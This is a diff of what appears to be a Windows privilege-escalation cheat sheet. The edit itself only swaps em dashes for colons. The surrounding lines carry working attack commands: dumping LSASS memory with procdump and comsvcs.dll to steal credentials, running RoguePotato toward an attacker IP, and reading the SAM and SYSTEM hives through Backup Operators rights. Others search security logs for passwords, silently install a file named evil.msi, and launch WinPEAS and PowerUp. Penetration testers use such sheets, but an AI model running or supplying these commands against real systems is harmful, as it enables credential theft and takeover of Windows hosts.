@@ -61,18 +61,18 @@ RoguePotato.exe -r <attacker-ip> -e "cmd.exe" -l 9999
 
 ### SeDebugPrivilege
 
-Allows attaching to any process — dump LSASS for credentials.
+Allows attaching to any process: dump LSASS for credentials.
 
 ```powershell
 # Check
 whoami /priv | findstr Debug
 
 # Dump LSASS (needs SeDebug)
-# Method 1 — Task Manager: right-click lsass.exe → Create dump file
-# Method 2 — procdump
+# Method 1: Task Manager: right-click lsass.exe → Create dump file
+# Method 2: procdump
 procdump.exe -ma lsass.exe lsass.dmp
 
-# Method 3 — comsvcs.dll
+# Method 3: comsvcs.dll
 tasklist | findstr lsass
 rundll32 C:\windows\system32\comsvcs.dll, MiniDump <lsass-PID> C:\lsass.dmp full
 
@@ -137,7 +137,7 @@ net stop dns && net start dns
 
 ### Backup Operators
 
-Can back up / restore any file — bypasses DACL. Use to read SAM/SYSTEM hive.
+Can back up / restore any file: bypasses DACL. Use to read SAM/SYSTEM hive.
 
 ```powershell
 # Check membership
@@ -199,7 +199,7 @@ whoami /priv | findstr SeLoadDriver
 
 ### Event Log Readers
 
-Can read security event logs — useful for credential harvesting.
+Can read security event logs: useful for credential harvesting.
 
 ```powershell
 wevtutil qe Security /f:text | Select-String -Pattern "password|credential|4624|4625"
@@ -242,13 +242,13 @@ msiexec /quiet /qn /i evil.msi
 ## Useful Tools
 
 ```powershell
-# WinPEAS — automated enumeration
+# WinPEAS: automated enumeration
 .\winPEASx64.exe
 
-# PowerUp — PowerShell privesc checks
+# PowerUp: PowerShell privesc checks
 Import-Module .\PowerUp.ps1
 Invoke-AllChecks
 
-# Seatbelt — security configuration survey
+# Seatbelt: security configuration survey
 .\Seatbelt.exe -group=all
 ```
